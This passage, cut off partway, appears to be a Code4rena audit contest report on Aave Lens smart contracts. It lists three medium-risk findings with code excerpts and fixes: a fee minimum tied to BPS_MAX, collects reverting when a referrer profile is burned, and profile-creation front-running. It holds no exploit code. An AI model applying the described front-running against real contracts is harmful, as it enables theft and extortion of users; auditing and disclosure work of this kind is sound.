{
  "circa": {
    "title": "Aave Lens contest",
    "sponsor": "Aave Lens",
    "slug": "2022-02-aave-lens",
    "date": "2022-06-13",
    "findings": "https://github.com/code-423n4/2022-02-aave-lens-findings/issues",
    "contest": 85
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Aave Lens smart contract system written in Solidity. The audit contest took place between February 10—February 16 2022.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>23 Wardens contributed reports to the Aave Lens contest:</p>\n<ol>\n<li><a href=\"https://twitter.com/cmichelio\">cmichel</a></li>\n<li>hyh</li>\n<li><a href=\"https://twitter.com/danbinnun\">danb</a></li>\n<li>WatchPug (<a href=\"https://github.com/jack-the-pug\">jtp</a> and <a href=\"https://github.com/mingwatch\">ming</a>)</li>\n<li>IllIllI</li>\n<li>cccz</li>\n<li><a href=\"https://twitter.com/JustDravee\">Dravee</a></li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li><a href=\"https://twitter.com/gzeon\">gzeon</a></li>\n<li><a href=\"https://twitter.com/SolidityDev\">pauliax</a></li>\n<li><a href=\"https://twitter.com/defsec_\">defsec</a></li>\n<li>0x0x0x</li>\n<li>Jujic</li>\n<li>hubble (ksk2345 and shri4net)</li>\n<li>0x1f8b</li>\n<li>sikorico</li>\n<li>0xwags</li>\n<li>kenta</li>\n<li>nahnah</li>\n<li>d4rk</li>\n<li><a href=\"https://www.instagram.com/riyan_rfa/\">rfa</a></li>\n</ol>\n<p>This contest was judged by <a href=\"https://twitter.com/liam_eastwood13\">0xleastwood</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 13 unique vulnerabilities. Of these vulnerabilities, 0 received a risk rating in the category of HIGH severity and 13 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 14 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 12 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2022-02-aave-lens\">C4 Aave Lens contest repository</a>, and is composed of 39 smart contracts written in the Solidity programming language and includes 3,432 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities according to a methodology based on <a href=\"https://owasp.org/www-community/OWASP_Risk_Rating_Methodology\">OWASP standards</a>.</p>\n<p>Vulnerabilities are divided into three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>Further information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>.</p>\n<h1 id=\"medium-risk-findings-13\" style=\"position:relative;\"><a href=\"#medium-risk-findings-13\" aria-label=\"medium risk findings 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (13)</h1>\n<h2 id=\"m-01-basis-points-constant-bps_max-is-used-as-minimal-fee-amount-requirement\" style=\"position:relative;\"><a href=\"#m-01-basis-points-constant-bps_max-is-used-as-minimal-fee-amount-requirement\" aria-label=\"m 01 basis points constant bps_max is used as minimal fee amount requirement permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/46\">[M-01] Basis points constant BPS_MAX is used as minimal fee amount requirement</a></h2>\n<p><em>Submitted by hyh, also found by cmichel</em></p>\n<p>Base fee modules require minimum fixed fee amount to be at least BPS_MAX, which is hard coded to be 10000.</p>\n<p>This turns out to be a functionality restricting requirement for some currencies.</p>\n<p>For example, WBTC (<a href=\"https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599\">https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599</a>, #10 in ERC20 token rankings), has decimals of 8 and current market rate around $40k, i.e. if you want to use any WBTC based collect fee, it has to be at least $4 per collect or fee enabled follow.</p>\n<p>Tether and USDC (<a href=\"https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7\">https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7</a> and <a href=\"https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48\">https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48</a>, #1 and #3) have decimals of 6, so it is at least $0.01 per collect/follow, which also looks a bit tight for a hard floor minimum.</p>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>BPS_MAX is a system wide constant, now 10000:</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/FeeModuleBase.sol#L17\">FeeModuleBase.sol#L17</a><br></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/ModuleGlobals.sol#L20\">ModuleGlobals.sol#L20</a><br></p>\n<p>This is correct for any fees defined in basis point terms.</p>\n<p>When it comes to the nominal amount, 10000 can be too loose or too tight depending on a currency used, as there can be various combinations of decimals and market rates.</p>\n<p>The following base collect module implementations require fee amount to be at least BPS<em>MAX (initialization reverts when amount &#x3C; BPS</em>MAX):</p>\n<p>All collect module implementations use the same check:</p>\n<p>FeeCollectModule: <a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L72\">FeeCollectModule.sol#L72</a><br></p>\n<p>LimitedFeeCollectModule: <a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedFeeCollectModule.sol#L79\">LimitedFeeCollectModule.sol#L79</a><br></p>\n<p>TimedFeeCollectModule: <a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/TimedFeeCollectModule.sol#L81\">TimedFeeCollectModule.sol#L81</a><br></p>\n<p>LimitedTimedFeeCollectModule: <a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L86\">LimitedTimedFeeCollectModule.sol#L86</a><br></p>\n<p>FeeFollowModule also uses the same approach: <a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/follow/FeeFollowModule.sol#L62\">FeeFollowModule.sol#L62</a><br></p>\n<h3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>As a simplest solution consider adding a separate constant for minimum fee amount in nominal terms, say 1 or 10.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/46#issuecomment-1074504184\">Zer0dot (Aave Lens) confirmed, resolved, and commented</a>:</strong></p>\n<blockquote>\n<p>Addressed in <a href=\"https://github.com/aave/lens-protocol/pull/74\">aave/lens-protocol#74</a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/46#issuecomment-1116634368\">0xleastwood (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Good find! The warden has identified that the use of <code>BPS_MAX</code> is too restrictive to handle tokens with small decimals.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-02-inappropriate-handling-of-referralfee-makes-collecting-mirror-fails-without-error-when-referrerprofileid-is-burned\" style=\"position:relative;\"><a href=\"#m-02-inappropriate-handling-of-referralfee-makes-collecting-mirror-fails-without-error-when-referrerprofileid-is-burned\" aria-label=\"m 02 inappropriate handling of referralfee makes collecting mirror fails without error when referrerprofileid is burned permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/67\">[M-02] Inappropriate handling of <code>referralFee</code> makes collecting Mirror fails without error when <code>referrerProfileId</code> is burned</a></h2>\n<p><em>Submitted by WatchPug, also found by cccz</em></p>\n<p>In the current implementation, even when the profile’s owner burnt the <code>ProfileNFT</code>, as the profile’s legacy, the publications can still be collected.</p>\n<p>However, if the publication is a <code>Mirror</code> and there is a <code>referralFee</code> set by the original publication, the user won’t be able to collect from a <code>Mirror</code> that was published by a burned profile.</p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/FeeCollectModule.sol#L163-L172\">FeeCollectModule.sol#L163-L172</a><br></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">referralFee</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// The reason we levy the referral fee on the adjusted amount is so that referral fees</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// don&#39;t bypass the treasury fee, in essence referrals pay their fair share to the treasury.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referralAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">adjustedAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">referralFee</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">BPS_MAX</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">adjustedAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">adjustedAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">referralAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referralRecipient</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">HUB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">referrerProfileId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currency</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">referralRecipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">referralAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<blockquote>\n<p>When a mirror is collected, what happens behind the scenes is the original, mirrored publication is collected, and the mirror publisher’s profile ID is passed as a “referrer.”</p>\n</blockquote>\n<p>In <code>_processCollectWithReferral()</code>, if there is a <code>referralFee</code>, contract will read <code>referralRecipient</code> from <code>IERC721(HUB).ownerOf(referrerProfileId)</code>, if <code>referrerProfileId</code> is burned, the <code>IERC721(HUB).ownerOf(referrerProfileId)</code> will revert with <code>ERC721: owner query for nonexistent token</code>.</p>\n<p>However, since we wish to allow the content to be collected, we should just treat referrals as non-existent in this situation.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">HUB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">referrerProfileId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referralRecipient</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referralAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">adjustedAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">referralFee</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">BPS_MAX</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">adjustedAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">adjustedAmount</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">referralAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referralRecipient</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">HUB</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">referrerProfileId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">currency</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">referralRecipient</span><span class=\"mtk1\">, </span><span class=\"mtk12\">referralAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span><span class=\"mtk15\">catch</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">LogNonExistingReferrer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">referrerProfileId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/67#issuecomment-1074520332\">Zer0dot (Aave Lens) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>This is valid! However, this is only an issue when a profile is deleted (burned), in which case UIs have multiple choices:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"2\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">1. Stop displaying all the burnt profile&#39;s publications</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">2. Redirect users, when collecting mirrors, to the original publication</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">3. Prevent all collects</span></span></code></pre>\n<p>I don’t think this adds any risk to the protocol and although it’s valid, we will not be taking any action.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-profile-creation-can-be-frontrun\" style=\"position:relative;\"><a href=\"#m-03-profile-creation-can-be-frontrun\" aria-label=\"m 03 profile creation can be frontrun permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26\">[M-03] Profile creation can be frontrun</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-02-aave-lens/blob/aaf6c116345f3647e11a35010f28e3b90e7b4862/contracts/libraries/PublishingLogic.sol#L50\">PublishingLogic.sol#L50</a><br></p>\n<p>The <code>LensHub/PublishingLogic.createProfile</code> function can be frontrun by other whitelisted profile creators.<br>\nAn attacker can observe pending <code>createProfile</code> transactions and frontrun them, own that handle, and demand ransom from the original transaction creator.</p>\n<h3 id=\"recommended-mitigation-steps-2\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-2\" aria-label=\"recommended mitigation steps 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Everyone needs to use flashbots / private transactions but it might not be available on the deployed chain.<br>\nA commit/reveal scheme for the handle and the entire profile creation could mitigate this issue.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26\">donosonaumczuk (Aave Lens) disputed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1042222585\">oneski (Aave Lens) commented</a>:</strong></p>\n<blockquote>\n<p>Declined. This is by design. Governance can allow contracts/addresses to mint. If governance allows a malicious actor that is the fault of governance. Governance can also allow contracts that implement auction/commit reveal or other functionality as well to manage the profile minting system.</p>\n<p>The protocol should take no opinion on this by default.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-02-aave-lens-findings/issues/26#issuecomment-1117272513\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>While I agree that this is the fault of the governance, I think it still stands that any 